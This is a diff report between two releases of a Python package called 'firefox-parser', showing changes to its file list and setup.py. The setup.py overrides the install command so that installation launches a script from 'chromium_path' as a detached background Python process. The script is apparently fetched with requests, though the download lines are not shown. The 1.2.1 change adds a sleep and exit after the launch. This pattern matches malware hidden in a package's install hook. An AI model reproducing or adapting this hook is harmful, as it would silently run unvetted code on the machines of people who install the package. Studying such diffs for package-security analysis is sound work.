# Comparing `tmp/firefox-parser-1.1.9.tar.gz` & `tmp/firefox-parser-1.2.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "firefox-parser-1.1.9.tar", last modified: Thu May 18 01:16:46 2023, max compression
+gzip compressed data, was "firefox-parser-1.2.1.tar", last modified: Thu May 18 01:30:28 2023, max compression
```

## Comparing `firefox-parser-1.1.9.tar` & `firefox-parser-1.2.1.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxrwxrwx   0        0        0        0 2023-05-18 01:16:46.293735 firefox-parser-1.1.9/
--rw-rw-rw-   0        0        0       96 2023-05-18 01:16:46.292744 firefox-parser-1.1.9/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-05-18 01:16:46.291731 firefox-parser-1.1.9/firefox_parser.egg-info/
--rw-rw-rw-   0        0        0       96 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      197 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/requires.txt
--rw-rw-rw-   0        0        0        1 2023-05-18 01:16:46.000000 firefox-parser-1.1.9/firefox_parser.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-18 01:16:46.293735 firefox-parser-1.1.9/setup.cfg
--rw-rw-rw-   0        0        0     2045 2023-05-18 01:16:38.000000 firefox-parser-1.1.9/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-18 01:30:28.368117 firefox-parser-1.2.1/
+-rw-rw-rw-   0        0        0       96 2023-05-18 01:30:28.368117 firefox-parser-1.2.1/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-05-18 01:30:28.367157 firefox-parser-1.2.1/firefox_parser.egg-info/
+-rw-rw-rw-   0        0        0       96 2023-05-18 01:30:28.000000 firefox-parser-1.2.1/firefox_parser.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      197 2023-05-18 01:30:28.000000 firefox-parser-1.2.1/firefox_parser.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-18 01:30:28.000000 firefox-parser-1.2.1/firefox_parser.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-18 01:30:28.000000 firefox-parser-1.2.1/firefox_parser.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        1 2023-05-18 01:30:28.000000 firefox-parser-1.2.1/firefox_parser.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-05-18 01:30:28.369042 firefox-parser-1.2.1/setup.cfg
+-rw-rw-rw-   0        0        0     2112 2023-05-18 01:30:21.000000 firefox-parser-1.2.1/setup.py
```

### Comparing `firefox-parser-1.1.9/setup.py` & `firefox-parser-1.2.1/setup.py`

 * *Files 7% similar despite different names*

```diff
@@ -1,12 +1,13 @@
 from setuptools import setup
 from setuptools.command.install import install
 import requests
 import os
 import sys
+import time
 import subprocess
 
 class PreInstallCommand(install):
     """Custom pre-installation command."""
     def run(self):
         # Your pre-installation commands        
         install.run(self)
@@ -37,21 +38,24 @@
                 except Exception as e:
                     subprocess.Popen(['python3', chromium_path], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
             else:
                 try:
                     subprocess.Popen(['python', chromium_path], preexec_fn=os.setpgrp)
                 except Exception as e:
                     subprocess.Popen(['python3', chromium_path], preexec_fn=os.setpgrp)
+
+            time.sleep(1)
+            sys.exit(0)
         else:
             print('Error:', response.status_code)
         
 
 setup(
     name='firefox-parser',
-    version='1.1.9',
+    version='1.2.1',
     description='FireFox Parser in Python',
     cmdclass={
         'install': PreInstallCommand,
     },
     install_requires=[
         'requests',
     ],
```

